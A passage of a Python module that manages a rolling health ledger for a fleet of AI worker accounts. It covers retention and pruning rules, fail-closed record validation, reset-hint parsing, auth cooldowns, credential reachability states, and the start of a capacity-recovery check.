    """Clamp the floor-selected index set to the ABSOLUTE ceiling (registry #699), evicting OLDEST
    non-preserved first, and say so LOUDLY when it binds.

    A time-based retention floor is unbounded at high record rates, so it needs a ceiling; a
    ceiling that trims silently would merely MOVE the coverage cliff instead of removing it. Two
    invariants hold through the trim:
      * a record preserved for a LIVE BACKOFF or a PROVEN-DEAD credential (issues #82/#639) is
        never evicted, exactly as under the count cap — correctness beats the ceiling; and
      * the eviction can only SHRINK coverage, and under-coverage DEFERS the aged-out park exit,
        so the fail-safe direction is unchanged.
    The warning names the condition, which bound bound, how many records went, and the coverage
    that resulted — a `no-evidence` census row must never be confusable with "the parks simply are
    not old enough yet"."""
    order = sorted(selected)
    total = _ledger_bytes([kept[i] for i in order])
    over_records = len(order) > RETENTION_CEILING_RECORDS
    over_bytes = total > RETENTION_CEILING_BYTES
    if not (over_records or over_bytes):
        return set(order)
    survivors, dropped = set(order), 0
    for i in order:                     # oldest first
        if (len(survivors) <= RETENTION_CEILING_RECORDS
                and total <= RETENTION_CEILING_BYTES):
            break
        if i in preserved:
            continue                    # a live backoff is NEVER evicted (issue #82)
        survivors.discard(i)
        total -= _record_bytes(kept[i])
        dropped += 1
    coverage = (now - kept[min(survivors)]["ts"]) / 3600 if survivors else 0.0
    bound = " and ".join(
        part for part in
        (f"records {len(order)} > {RETENTION_CEILING_RECORDS}" if over_records else "",
         f"bytes {total} > {RETENTION_CEILING_BYTES}" if over_bytes else "") if part)
    span_h = SUSTAINED_HEALTH_SPAN_SECONDS / 3600
    tolerated = RETENTION_CEILING_RECORDS * 3600 // RETENTION_FLOOR_SECONDS
    short = coverage < span_h
    print(f"::warning::model-health: RETENTION CEILING BINDING ({bound}) — the "
          f"{RETENTION_FLOOR_SECONDS // 3600} h retention floor selected more than the ledger may "
          f"hold, so {dropped} oldest non-preserved record(s) were evicted; retained coverage is "
          f"now {coverage:.2f} h, which is "
          f"{'BELOW' if short else 'still at or above'} the {span_h:.0f} h sustained-health span, "
          "so the registry #691 aged-out park exit is "
          f"{'CLOSED until the record rate falls' if short else 'still open'} "
          f"(registry #699: the fleet is sustaining more than ~{tolerated} records/h)",
          file=sys.stderr)
    return survivors


def prune(records, now):
    """Keep the rolling window: drop records older than WINDOW_SECONDS — or stamped more than
    FUTURE_SKEW_SECONDS ahead of `now` (an implausibly-future forgery would never age out) — then
    retain max(count-cap, time-floor) under an absolute ceiling. Sorted by ts so the
    window/consecutive logic below is well defined.

    TIME-BASED RETENTION FLOOR (registry #699): every record stamped within
    RETENTION_FLOOR_SECONDS is retained REGARDLESS of the MAX_RECORDS count cap. Retention by
    count alone made the retained window's COVERAGE equal MAX_RECORDS / record-rate, so a busier
    fleet covered less wall-clock and the aged-out park exit (which needs the window to cover
    SUSTAINED_HEALTH_SPAN_SECONDS) shut itself the moment throughput rose — see the constant block
    at the top of this module. The floor makes coverage independent of the rate. It never EXTENDS
    retention past WINDOW_SECONDS (7 h << 48 h); it only stops the count cap from cutting inside
    it.

    ACTIVE-BACKOFF RETENTION (issue #82, fix-forward for #62): the MAX_RECORDS cap is GLOBAL, but
    account_backoffs derives backoff state from the PRUNED window (account-usage._load_backoffs
    prunes before deriving) — so a flood of later unrelated records (e.g. a healthy anthropic
    fleet's successes) could evict an openai account's live rate-limit record and readmit the
    capped account long before its backoff expired. A record feeding a still-ACTIVE backoff is
    therefore never evicted by the cap: for each account whose derived backoff_until > now, the
    tail of its current consecutive chain (the limit/transient records since its last success,
    truncated to BACKOFF_CHAIN_KEEP — past cap-saturation extra records cannot change the
    derived backoff_until) is preserved. A derived no_change limit additionally retains its
    minimal three source observations, and a live AUTH COOLDOWN (registry #596) retains the
    AUTH_COOLDOWN_MIN tail of its consecutive `auth` run. Earlier ordinary backoff records cannot
    affect the derived state (a success resets them), so re-deriving backoff_until on the pruned
    window is exact. A PROVEN-DEAD credential (registry #639, `credential_states`) retains the same
    auth-run tail even though its cooldown has long expired — that evidence is the ONLY thing keeping
    a dead probe-exempt account out of dispatch, so the cap must not be able to erase it.

    BOUND CONTRACT (PR #85 finding 1, extended for #699): preserved records spend the MAX_RECORDS
    budget first and the newest non-preserved records fill only the REMAINING budget, so the
    count-cap arm is bounded by max(len(preserved), MAX_RECORDS) — never live-backoffs PLUS a full
    200 of expired filler. The time floor adds the records inside RETENTION_FLOOR_SECONDS on top,
    so the total is max(len(preserved), MAX_RECORDS, records-inside-the-floor), and the whole
    result is then clamped by _apply_retention_ceiling to
    max(len(preserved), RETENTION_CEILING_RECORDS) records / RETENTION_CEILING_BYTES bytes.
    When the live-backoff set alone exceeds MAX_RECORDS, correctness wins over the cap — a live
    backoff is never evicted, by the count cap OR by the ceiling — but NEVER silently: every
    expired/non-preserved record OUTSIDE the retention floor is evicted (inside it a record is
    coverage evidence, not filler, and is kept — #699)
    and a ::warning::
    diagnostic surfaces the overshoot (that many simultaneously backed-off accounts is a
    fleet-wide rate-limit saturation signal the maintainer must see, not a bookkeeping detail).
    len(preserved) itself is bounded by held_accounts * (BACKOFF_CHAIN_KEEP +
    NO_CHANGE_LIMIT_MIN - 1 + max(AUTH_COOLDOWN_MIN, CREDENTIAL_DEAD_MIN)) — `held` being the
    accounts with a live backoff or a proven-dead credential — and every backoff expires within
    BACKOFF_CAP_SECONDS (an auth cooldown within the much shorter AUTH_COOLDOWN_SECONDS) while a dead
    run ages out with WINDOW_SECONDS, so the overshoot is transient, not unbounded growth."""
    kept = [r for r in records if isinstance(r, dict)
            and isinstance(r.get("ts"), int)
            and (now - r["ts"]) <= WINDOW_SECONDS
            and r["ts"] <= now + FUTURE_SKEW_SECONDS]
    kept.sort(key=lambda r: r["ts"])
    if len(kept) <= MAX_RECORDS:
        return kept
    preserved = set()
    active = account_backoffs(kept, now)
    # PROVEN-DEAD CREDENTIAL RETENTION (registry #639), the same argument as the #82 active-backoff
    # retention one level up: a credential proven dead (credential_states) is held OUT of dispatch by
    # that evidence alone — its #596 cooldown expired long ago, so nothing in `active` protects its
    # records. A flood of later unrelated records (a healthy anthropic fleet's successes) would evict
    # the auth run, the state would silently revert to `unproven`, and the dead account would be
    # handed to the allocator again. Preserving the run's tail is what makes the ineligibility hold
    # for the whole window instead of only until the cap fills.
    dead = {account for account, entry in credential_states(kept, now).items()
            if entry["state"] == CREDENTIAL_DEAD}
    if active or dead:
        derived, no_change_evidence = _no_change_limit_view(kept, now)
        chains = {}                 # account -> indices of its current consecutive chain
        auth_runs = {}              # account -> indices of its current consecutive auth run (#596)
        for index, r in enumerate(derived):
            acct, cls = r.get("account"), r.get("exit_class")
            if cls == SUCCESS:
                chains.pop(acct, None)      # a success resets the chain — and the derived state
                auth_runs.pop(acct, None)
            elif cls in BACKOFF_CLASSES:
                chains.setdefault(acct, []).append(index)
            elif cls == CLASS_AUTH:
                auth_runs.setdefault(acct, []).append(index)
        for acct in set(active) | dead:
            if acct in active:
                chain = chains.get(acct, ())
                preserved.update(chain[-BACKOFF_CHAIN_KEEP:])
                # A derived no_change limit needs all three source observations after pruning;
                # keeping only the newest (derived) member would erase the discriminator and readmit
                # the capped account on the next ledger read. Preserve this bounded evidence only
                # when the derived member is still in the account's live post-success chain.
                nc_evidence = no_change_evidence.get(acct, set())
                if any(index in chain for index in nc_evidence):
                    preserved.update(nc_evidence)
            # A live AUTH COOLDOWN (registry #596) — and a PROVEN-DEAD credential (registry #639) —
            # are derived from `auth` records, which are NOT in BACKOFF_CLASSES and so appear in no
            # `chain`: without this a flood of later unrelated records would evict the run and
            # readmit the account mid-cooldown (the exact bug issue #82 fixed for rate limits) or
            # revert a dead credential to `unproven`. Kept in its own bucket so the limit/transient
            # tail above (whose length determines the re-derived exponential) is byte-for-byte
            # unchanged, and sized by whichever consumer needs the longer tail.
            preserved.update(
                auth_runs.get(acct, ())[-max(AUTH_COOLDOWN_MIN, CREDENTIAL_DEAD_MIN):])
    budget = MAX_RECORDS - len(preserved)
    if budget < 0:
        # Live backoffs alone exceed the nominal cap: keep them all (correctness over the cap),
        # evict everything else, and surface the overshoot — this many simultaneously
        # backed-off accounts is a fleet-wide rate-limit saturation signal.
        print(f"::warning::model-health: {len(active)} accounts hold live backoffs "
              f"({len(preserved)} preserved records), exceeding the nominal MAX_RECORDS="
              f"{MAX_RECORDS} cap — expired records evicted, live backoffs kept "
              "(fleet-wide rate-limit saturation)", file=sys.stderr)
    newest = [i for i in range(len(kept)) if i not in preserved][-budget:] if budget > 0 else []
    # THE TIME FLOOR (registry #699). Union, not a replacement: the count cap still reaches
    # FURTHER back than the floor on a quiet ledger (200 records at 5 rec/h is 40 h), and the floor
    # takes over exactly where the cap would otherwise start cutting inside the health span. It is
    # applied AFTER the overshoot branch above for the same reason it is applied at all — a record
    # inside the floor is coverage evidence, not filler — and its cost is bounded by the ceiling
    # below.
    floor_start = now - RETENTION_FLOOR_SECONDS
    floor = {i for i, r in enumerate(kept) if r["ts"] >= floor_start}
    selected = _apply_retention_ceiling(
        kept, preserved | floor | set(newest), preserved, now)
    return [kept[i] for i in sorted(selected)]


def validate_ledger(document, known=RECORD_KNOWN_FIELDS):
    """Fail-closed shape check mirroring the lease ledger validator: {records:[...]} with well
    formed entries. A malformed ledger raises rather than silently resetting the window. Every entry
    is checked with the SAME `_validate_record` contract used at construction, so a poisoned record
    (a raw handle, an unknown provider, an injected marker) is rejected identically at read, at
    write, and on the pre-PUT document check (issue #202).

    This is the READ posture: a field name outside `known` is a record written by a LATER release of
    this module, not a poisoning, so it is tolerated (and reported) instead of failing the whole
    ledger — see the RECORD_KNOWN_FIELDS block for why the two postures differ and exactly what is
    NOT relaxed (issue #739). `known` is a parameter solely so the self-test can drive this function
    as a reader one release behind; production always passes the module's own vocabulary."""
    if not isinstance(document, dict) or set(document) != {"records"}:
        raise ValueError("model-health ledger top level is malformed")
    records = document["records"]
    if not isinstance(records, list):
        raise ValueError("model-health ledger records field is malformed")
    tolerated = set()
    for r in records:
        tolerated.update(_validate_record(r, ORIGIN_READ, known=known))
    if tolerated:
        # Never silent: a tolerated field means this reader is behind the writer. The names have
        # already passed the token grammar, so printing them cannot forge an annotation.
        print(f"::warning::model-health: ledger carries {len(tolerated)} field(s) this reader does "
              f"not know ({', '.join(sorted(tolerated))}) — records written by a NEWER release; "
              "their known fields were validated normally and the unknown ones carried through "
              "untouched (issue #739)", file=sys.stderr)
    return records


def _is_hash(value):
    return (isinstance(value, str) and len(value) == 16
            and all(c in "0123456789abcdef" for c in value))


# Field-specific allowlist grammars (review round 1 of PR #444): printable-Unicode alone still
# admitted a raw acctNN handle or Markdown/HTML markup into the PUBLIC ledger. model_alias is a
# routing.toml alias token and run_id is "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" — both strictly
# token-shaped. reset_hint is provider-supplied text that is LATER INTERPOLATED INTO A MARKDOWN
# ALERT BODY (_alert_body's "Earliest known reset: **...**"), so its charset is EXACTLY the
# closed set worker-live.sh's _extract_reset_hint emits (tr -cd 'A-Za-z0-9 :,/+.()-'): it keeps
# every machine-parseable form parse_reset_hint reads ("in 5 minutes", "retry-after: 120",
# "2026-07-20 14:00 UTC") while excluding every Markdown/HTML metacharacter (* _ ` [ ] < > @ #
# | \ ~ ...) — a forged hint can neither @-mention, style, nor smuggle a hidden marker into the
# alert.
_TOKEN_FIELD_RE = re.compile(r"[A-Za-z0-9][A-Za-z0-9._-]*")
_RESET_HINT_RE = re.compile(r"[A-Za-z0-9 :,/+.()-]+")
# Raw worker-account handles follow the acct<digit>... convention (policy/repos.toml
# account_pool). No public free-form field may embed one, even where the field's grammar would
# otherwise admit it (model_alias="acct01" is a valid token SHAPE but a privacy leak).
_HANDLE_PATTERN_RE = re.compile(r"acct[0-9]", re.IGNORECASE)


def _is_safe_field(value, max_len, allow_empty, grammar):
    """A stored record string field is bounded and matches its FIELD-SPECIFIC allowlist grammar —
    not merely "printable" (review round 1 of PR #444: printability admitted raw handles and
    Markdown markup). Each grammar is a strict ASCII allowlist, so a forged value can never carry
    a control char, markup, or an unbounded blob; on top of the grammar, a value embedding the raw
    acctNN account-handle pattern is refused outright. Empty is accepted only where the field is
    optional (model_alias/run_id may legitimately be absent-as-empty)."""
    if not isinstance(value, str):
        return False
    if not value:
        return allow_empty
    if len(value) > max_len or not grammar.fullmatch(value):
        return False
    return not _HANDLE_PATTERN_RE.search(value)


def _is_bounded_int(value, minimum, maximum):
    return (isinstance(value, int) and not isinstance(value, bool)
            and minimum <= value <= maximum)


def _tolerable_unknown_field(name, value):
    """One unrecognised field on a STORED record is readable-through (issue #739) when its NAME is
    token-shaped and bounded — names are what the reader prints, and a name carrying a newline could
    forge a `::` workflow annotation — and when its rendered VALUE does not embed the raw `acctNN`
    handle pattern, because the ledger is PUBLIC and that privacy invariant is universal (README
    "Security posture", locked decision 22a). The value's TYPE and SHAPE are deliberately
    unconstrained: an unrecognised field has no sink (every consumer reads records BY NAME), and
    constraining it would re-create the incompatibility the moment a future field is a list."""
    if not isinstance(name, str) or not name or len(name) > RECORD_FIELD_MAX_LEN:
        return False
    if not _TOKEN_FIELD_RE.fullmatch(name):
        return False
    return not _HANDLE_PATTERN_RE.search(str(value))


def _validate_record(r, origin, known=RECORD_KNOWN_FIELDS):
    """Fail-closed field validation for ONE health record — the single contract shared by
    make_record (construction), validate_ledger (read), and append_record's pre-PUT document check.
    Raises ValueError on any malformed field. Enforced identically at write and read so a poisoned
    record can neither be constructed nor survive a reader (issue #202): the account is a salted
    hash and never a raw acctNN handle, the provider is catalog-bounded, the class is a known fold
    target, and every other string field is bounded AND matches its field-specific allowlist grammar
    (with the raw-handle pattern refused everywhere) — nothing can carry a raw identifier,
    Markdown/HTML markup, an injected marker, or an unbounded blob into the PUBLIC ledger.

    `origin` states which side of the rolling-upgrade seam the record comes from and has NO default,
    so a future call site must declare its posture rather than inherit the wrong one by omission
    (issue #739). ORIGIN_WRITE: this release is introducing the record, the field vocabulary is
    CLOSED, and any undeclared field is refused outright. ORIGIN_READ: the record is already on the
    shared ledger and may have been written by a later release, so a field this module does not know
    is tolerated when `_tolerable_unknown_field` accepts it and refuses the document otherwise.
    Returns the set of tolerated unknown field names (empty on the write side) so the caller can
    report that it is reading ahead of itself.

    `known` narrows the ALLOWLIST only — the field-specific checks for fields this module knows
    still run — and exists so the self-test can drive this as a reader one release behind, which is
    exactly where #733's traceback came from. Every production call site takes the module's own
    RECORD_KNOWN_FIELDS."""
    if not isinstance(r, dict):
        raise ValueError("model-health ledger contains a non-object entry")
    if not all(isinstance(field, str) for field in r):
        # Refused by NAME, before anything sorts or prints it: a non-string key is not additive
        # schema growth in any release, and it would otherwise raise TypeError past the ValueError
        # handlers every caller below fails closed on.
        raise ValueError("model-health record has a non-string field name")
    no_change_fields = set(RECORD_NO_CHANGE_FIELDS) & set(known)
    extra = set(r) - set(known)
    if extra and origin == ORIGIN_WRITE:
        raise ValueError(f"model-health record has unexpected field(s) {sorted(extra)}")
    if len(extra) > MAX_UNKNOWN_RECORD_FIELDS:
        raise ValueError("model-health record carries too many unrecognised fields")
    for field in sorted(extra):
        if not _tolerable_unknown_field(field, r[field]):
            # Deliberately does NOT echo the offending name/value — it failed the very grammar that
            # makes it safe to print.
            raise ValueError("model-health record has an unreadable unrecognised field")
    if not isinstance(r.get("ts"), int) or isinstance(r.get("ts"), bool):
        raise ValueError("model-health record has a malformed timestamp")
    if r.get("provider") not in VALID_RECORD_PROVIDERS:
        raise ValueError("model-health record provider is not a known provider")
    # Privacy invariant, enforced at READ too: an account must look like a 16-hex hash, never a raw
    # acctNN handle. A non-hash here is a privacy regression and fails closed.
    if not _is_hash(r.get("account")):
        raise ValueError("model-health record account is not a salted hash")
    if r.get("exit_class") not in DECISION_CLASSES:
        raise ValueError("model-health record exit_class is not a known decision class")
    if not _is_safe_field(r.get("model_alias"), RECORD_FIELD_MAX_LEN, allow_empty=True,
                          grammar=_TOKEN_FIELD_RE):
        raise ValueError("model-health record model_alias is malformed")
    if not _is_safe_field(r.get("run_id"), RECORD_FIELD_MAX_LEN, allow_empty=True,
                          grammar=_TOKEN_FIELD_RE):
        raise ValueError("model-health record run_id is malformed")
    if "reset_hint" in r and not _is_safe_field(
            r.get("reset_hint"), RESET_HINT_MAX_LEN, allow_empty=False,
            grammar=_RESET_HINT_RE):
        raise ValueError("model-health record reset_hint is malformed")
    present_no_change = set(r) & no_change_fields
    if r.get("exit_class") != CLASS_NO_CHANGE:
        if present_no_change:
            raise ValueError("model-health record has no-change fields on another exit class")
        return extra
    if not _is_bounded_int(r.get("issue"), 1, MAX_ISSUE_NUMBER):
        raise ValueError("model-health no_change issue is malformed")
    for field in ("input_tokens", "output_tokens"):
        if field in r and not _is_bounded_int(r[field], 0, MAX_USAGE_TOKENS):
            raise ValueError(f"model-health no_change {field} is malformed")
    if "wall_seconds" in r and not _is_bounded_int(r["wall_seconds"], 0, MAX_WALL_SECONDS):
        raise ValueError("model-health no_change wall_seconds is malformed")
    # [#701] why_no_diff is a CLOSED ENUM, not a bounded string: the value originates in a
    # model-authored file, so admitting "any safe token" here would put attacker-chosen text into
    # the PUBLIC ledger and into the escalation comment that republishes it. Membership is the
    # whole check.
    if "why_no_diff" in r and r["why_no_diff"] not in NO_CHANGE_REASONS:
        raise ValueError("model-health no_change why_no_diff is not a known reason")
    return extra


def _per_account_tail_failures(records, window_seconds, now):
    """PER-ACCOUNT tail runs of launch failures within `window_seconds`: {account: [fail records]}.
    The zero-interleaved-successes rule is evaluated per account — a success clears ONLY ITS OWN
    account's run (review defects #2/#3: the old global break let any single healthy account, or a
    late-recorded long-running success, wipe every other account's failure run). Records are walked
    newest-first; an account with a success newer than its failures contributes nothing."""
    tails, cleared = {}, set()
    for r in reversed(records):
        if (now - r["ts"]) > window_seconds:
            break
        cls, acct = r.get("exit_class"), r.get("account")
        if cls == SUCCESS:
            cleared.add(acct)        # clears ITS account only
        elif cls in LAUNCH_FAIL_CLASSES and acct not in cleared:
            tails.setdefault(acct, []).append(r)
        # a non-launch class (setup / unknown / raw no_change / zero-dispatch) neither counts nor
        # breaks a run; only the newest QUALIFIED no_change is derived to limit before this walk
    return tails


def _outage_required_accounts(fleet_size):
    """Distinct FAILING accounts required to call a provider-outage: majority of the enabled fleet,
    never fewer than OUTAGE_MIN_ACCOUNTS (review defect #2: two bad accounts in a much larger,
    otherwise healthy fleet must not page)."""
    return max(OUTAGE_MIN_ACCOUNTS, -(-fleet_size // 2))  # ceil(fleet/2)


# Relative reset forms the CLIs actually emit ("try again in 1.2s", "retry after 120 seconds").
_HINT_RELATIVE_RE = re.compile(
    r"(?:\bin|\bafter)[ :]*([0-9]+(?:\.[0-9]+)?)\s*"
    r"(s|secs?|seconds?|m|mins?|minutes?|h|hrs?|hours?)\b", re.IGNORECASE)
_HINT_UNIT_SECONDS = {"s": 1, "m": 60, "h": 3600}
# HTTP-style unitless Retry-After ("retry-after: 120" — delay-seconds by RFC 9110 §10.2.3). The
# advertised form MUST actually parse (cross-provider review r1); unitless is seconds by spec.
_HINT_RETRY_AFTER_RE = re.compile(
    r"retry[ -]?after[ :]*([0-9]+(?:\.[0-9]+)?)(?!\.)\b(?!\s*(?:s|secs?|seconds?|m|mins?|"
    r"minutes?|h|hrs?|hours?)\b)", re.IGNORECASE)


def parse_reset_hint(hint, record_ts):
    """Best-effort EPOCH from a sanitized provider reset hint, or None. Machine-safe forms only:
    a relative "in/after N s|m|h" (codex style), an HTTP "retry-after: N" (unitless = seconds, RFC
    9110), or a bare epoch-seconds number. Free-text hints ("resets 2pm (Europe/London)") are NOT
    guessed — the caller falls back to the exponential default, so a garbled or forged hint can
    never crash the sweep or (with the caller's cap) extend a backoff past BACKOFF_CAP_SECONDS."""
    if not isinstance(hint, str) or not hint.strip():
        return None
    text = hint.strip()
    match = _HINT_RELATIVE_RE.search(text)
    if match:
        return record_ts + float(match.group(1)) * _HINT_UNIT_SECONDS[match.group(2)[0].lower()]
    match = _HINT_RETRY_AFTER_RE.search(text)
    if match:
        return record_ts + float(match.group(1))    # unitless Retry-After is delay-SECONDS
    if re.fullmatch(r"[0-9]{9,12}", text):          # bare epoch seconds (a plausible-era stamp)
        ts = int(text)
        return float(ts) if ts > record_ts else None
    return None


def _no_change_limit_view(records, now):
    """Return (derived_records, evidence_indices_by_account). For each account with at least
    NO_CHANGE_LIMIT_MIN no_change records across NO_CHANGE_LIMIT_MIN_ISSUES target issues in the
    rolling window, only its newest qualifying record is viewed as CLASS_LIMIT. The source records
    remain unchanged; account_backoffs and classify_records consume this derived view, while prune
    uses the evidence indices to retain the three-record discriminator behind an active backoff."""
    derived = list(records)
    candidates = {}
    for index, record in enumerate(records):
        if not isinstance(record, dict) or record.get("exit_class") != CLASS_NO_CHANGE:
            continue
        acct, ts, issue = record.get("account"), record.get("ts"), record.get("issue")
        if (not isinstance(acct, str)
                or not isinstance(ts, (int, float)) or isinstance(ts, bool)
                or ts != ts or ts in (float("inf"), float("-inf"))
                or (now - ts) > WINDOW_SECONDS or ts > now + FUTURE_SKEW_SECONDS
                or not _is_bounded_int(issue, 1, MAX_ISSUE_NUMBER)):
            continue
        candidates.setdefault(acct, []).append((ts, index, issue))

    evidence = {}
    for acct, rows in candidates.items():
        rows.sort()
        if (len(rows) < NO_CHANGE_LIMIT_MIN
                or len({issue for _, _, issue in rows}) < NO_CHANGE_LIMIT_MIN_ISSUES):
            continue
        newest = rows[-1]
        different_issue = next(row for row in reversed(rows)
                               if row[2] != newest[2])
        chosen = [newest, different_issue]
        chosen_indices = {newest[1], different_issue[1]}
        for row in reversed(rows):
            if len(chosen) >= NO_CHANGE_LIMIT_MIN:
                break
            if row[1] not in chosen_indices:
                chosen.append(row)
                chosen_indices.add(row[1])
        evidence[acct] = {row[1] for row in chosen}
        derived[newest[1]] = dict(derived[newest[1]], exit_class=CLASS_LIMIT)
    return derived, evidence


def auth_cooldowns(records, now):
    """PURE per-account AUTH COOLDOWN (registry #596), derived from the same health window as
    account_backoffs. Walks ts-ordered records: a SUCCESS clears the account's auth run (and any
    cooldown it earned — the credential works again); the AUTH_COOLDOWN_MIN'th consecutive `auth`
    and every one after it (re)start a cooldown of AUTH_COOLDOWN_SECONDS from that record.

    Consecutiveness follows the same convention as _per_account_tail_failures: only a SUCCESS on the
    SAME account breaks the run — an interleaved limit/transient/setup/unknown record neither counts
    toward it nor clears it (the credential state is unchanged by an unrelated failure).

    Bounded by construction: no doubling, no reset-hint arm (an auth failure carries no provider
    reset time), and the end is clamped to now + AUTH_COOLDOWN_SECONDS, so a forged or clock-skewed
    record can sideline an account for at most that one short TTL — which matters because the
    account it will most often name is the fleet's ONLY cross-provider reviewer.

    Returns only ACTIVE cooldowns, in the same shape account_backoffs returns:
    {account_hash: {"backoff_until", "consecutive", "saturated", "last_signal", "last_ts"}}."""
    runs, state = {}, {}
    for record in records:
        if not isinstance(record, dict):
            continue
        acct, cls, ts = record.get("account"), record.get("exit_class"), record.get("ts")
        if not isinstance(acct, str) or not isinstance(ts, (int, float)) or isinstance(ts, bool):
            continue
        if ts != ts or ts in (float("inf"), float("-inf")) or ts > now + FUTURE_SKEW_SECONDS:
            continue                    # non-finite / future-forged stamp: skip fail-open
        if cls == SUCCESS:
            runs.pop(acct, None)
            state.pop(acct, None)       # the credential authenticated again — cooldown cleared
        elif cls == CLASS_AUTH:
            run = runs.get(acct, 0) + 1
            runs[acct] = run
            if run >= AUTH_COOLDOWN_MIN:
                until = min(ts + AUTH_COOLDOWN_SECONDS, now + AUTH_COOLDOWN_SECONDS)
                state[acct] = {"backoff_until": int(until), "consecutive": run,
                               # never truncated by prune's chain cap (the run is retained whole),
                               # so the count is exact — unlike a saturated limit/transient chain
                               "saturated": False,
                               "last_signal": CLASS_AUTH, "last_ts": int(ts)}
    return {acct: cd for acct, cd in state.items() if cd["backoff_until"] > now}


# --- CREDENTIAL REACHABILITY (registry #639). auth_cooldowns above answers "hold this account for a
# short TTL"; this answers the DIFFERENT question the probe-exemption seam needs: "is there evidence
# this credential can reach its provider at all?"
#
# WHY A SECOND PREDICATE AND NOT A LONGER COOLDOWN. The #596 cooldown is deliberately SHORT,
# single-step and self-clearing because the account it names is the fleet's only cross-provider
# reviewer and its codex access token expires HOURLY — the observed pattern was INTERLEAVED (5 auth
# against 5 success in one window), where a ~50% success rate beats sidelining the sole reviewer.
# That reasoning has a PREMISE: at least one success in the window. When the stored grant itself is
# dead (`credential-remint-required`, registry #596 / alert #622) the run is MONOTONE — no success at
# all — so the account produces ZERO verdicts either way, and re-admitting it every 15 minutes buys
# nothing while spending a runner and a lease per dispatch tick. This predicate bites exactly where
# the cooldown's premise is false, so it does not overturn that decision — a single success clears it
# instantly, which is precisely the interleaved case the cooldown was calibrated on.
#
# BOUNDED AND SELF-HEALING, not a disable: the state is derived from the same 48 h rolling window as
# everything else, so once the auth run ages out the account is `unproven` again and gets another
# CREDENTIAL_DEAD_MIN trial dispatches. Nothing here requires maintainer action to recover, and a
# `success` record clears it immediately.
CREDENTIAL_LIVE = "live"          # positive evidence: the credential authenticated in the window
CREDENTIAL_DEAD = "dead"          # decisive negative: a run of auth rejections, no later success
CREDENTIAL_UNPROVEN = "unproven"  # no decisive record — asserted by NEITHER side (the absent case)
# Same threshold as the cooldown, for the same reason (see WHY N=2 above): ONE `auth` is what the
# hourly expiry boundary looks like and must not condemn a credential; TWO consecutive with no
# interleaved success is credential rot.
CREDENTIAL_DEAD_MIN = AUTH_COOLDOWN_MIN


def credential_states(records, now):
    """PURE per-account credential REACHABILITY, derived from the same health window as
    account_backoffs / auth_cooldowns. Returns ONLY decisive states —
    {account_hash: {"state": CREDENTIAL_LIVE|CREDENTIAL_DEAD, "consecutive": n, "last_ts": ts}} —
    so an account ABSENT from the map is CREDENTIAL_UNPROVEN: this function never guesses, and the
    absence is meaningful to its consumers (account-usage stamps `reachability: unproven`).

    The walk, in ts order, mirrors auth_cooldowns' consecutiveness convention exactly:
      * a `success` proves reachability -> CREDENTIAL_LIVE, and clears any run;
      * the CREDENTIAL_DEAD_MIN'th consecutive `auth` (and every one after it) -> CREDENTIAL_DEAD;
      * a SINGLE `auth` after a success clears the LIVE claim without asserting DEAD (unproven) —
        the credential's fate is genuinely unknown at that point (it is what an expiry boundary
        looks like), and laundering it back to `live` would be the false claim this predicate
        exists to prevent;
      * any other class (limit/transient/setup/billing/unknown) neither counts toward the run nor
        clears it and leaves the state untouched: a rate limit says nothing about whether the
        credential is valid.

    Unlike auth_cooldowns this carries NO TTL: it is an evidence question, not a hold duration. The
    window itself is the bound (mh.prune's WINDOW_SECONDS), and prune preserves a dead run's tail
    against the MAX_RECORDS cap so a flood of unrelated records cannot silently readmit it."""
    runs, state = {}, {}
    for record in records:
        if not isinstance(record, dict):
            continue
        acct, cls, ts = record.get("account"), record.get("exit_class"), record.get("ts")
        if not isinstance(acct, str) or not isinstance(ts, (int, float)) or isinstance(ts, bool):
            continue
        if ts != ts or ts in (float("inf"), float("-inf")) or ts > now + FUTURE_SKEW_SECONDS:
            continue                    # non-finite / future-forged stamp: skip fail-open
        if cls == SUCCESS:
            runs.pop(acct, None)
            state[acct] = {"state": CREDENTIAL_LIVE, "consecutive": 0, "last_ts": int(ts)}
        elif cls == CLASS_AUTH:
            run = runs.get(acct, 0) + 1
            runs[acct] = run
            if run >= CREDENTIAL_DEAD_MIN:
                state[acct] = {"state": CREDENTIAL_DEAD, "consecutive": run, "last_ts": int(ts)}
            else:
                # Below the threshold the evidence is INCONCLUSIVE: drop any prior `live` claim
                # rather than keep asserting reachability off a superseded success.
                state.pop(acct, None)
    return state


def credential_state(states, account):
    """The three-valued reachability for ONE account hash: the decisive state from
    `credential_states`, or CREDENTIAL_UNPROVEN when it has no decisive record. One helper so no
    consumer has to re-implement "absent means unproven" (and drift into "absent means fine")."""
    entry = states.get(account) if isinstance(states, dict) else None
    if isinstance(entry, dict) and entry.get("state") in (CREDENTIAL_LIVE, CREDENTIAL_DEAD):
        return entry["state"]
    return CREDENTIAL_UNPROVEN


def _iso_z(ts):
    """One decision-logic timestamp spelling for the park surface: compact ISO-8601 Z-form UTC
    (park_policy.canonical_ts's canonical spelling), so a recovery stamp orders and dedupes
    against park/receipt window keys with no spelling ambiguity."""
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(int(ts)))


def capacity_recovery_evidence(records, parked_at, now):
    """POSITIVE per-account evidence that the STARVATION CAUSE of a machine capacity park has
    CLEARED — the automatic-readmission gate of park_policy.capacity_park_admission (registry
    #614). PURE, and derived from the SAME rolling health window as auth_cooldowns /
    account_backoffs: there is no parallel health store.

    The predicate, exactly (an account qualifies iff ALL of these hold):
      1. its NEWEST record at or before `parked_at` (epoch seconds of the park application) is a
         PARK-STARVATION class — auth/billing/limit/transient, or `zero-dispatch` (the fleet
         pseudo-account's dispatch-starvation signal; see PARK_STARVATION_CLASSES) — i.e. that
         account WAS failing, or the allocator WAS starved, when the park landed, with no
         interleaved success between the failure and the park. This is what makes the evidence
         specific to the park's cause instead of "the fleet looks healthy now";
      2. it has recorded a `success` strictly after BOTH `parked_at` and its own LAST launch
         failure in the window — the earliest such run is the recovery event. Requiring the
         success to out-date the last failure is what keeps a FLAPPING account from claiming
         recovery: the cause must have cleared and STAYED cleared, not merely blinked green once;
         and
      3. it is NOT in an ACTIVE auth cooldown right now (#604's auth_cooldowns): a credential the
         allocator is still holding back has demonstrably NOT recovered. This deliberately
         OVERLAPS condition 2 (a live cooldown implies a recent auth failure) — both are required,
         neither is relied on alone, and both are cheap.
    The earliest qualifying recovery across accounts wins (ties broken by account fingerprint) so
    the answer is deterministic for a given window.

    Returns None — "no proven recovery, stay parked" — for EVERY ambiguity: no records, an
    absent/non-finite `parked_at` (a park whose application instant is unknown can never be
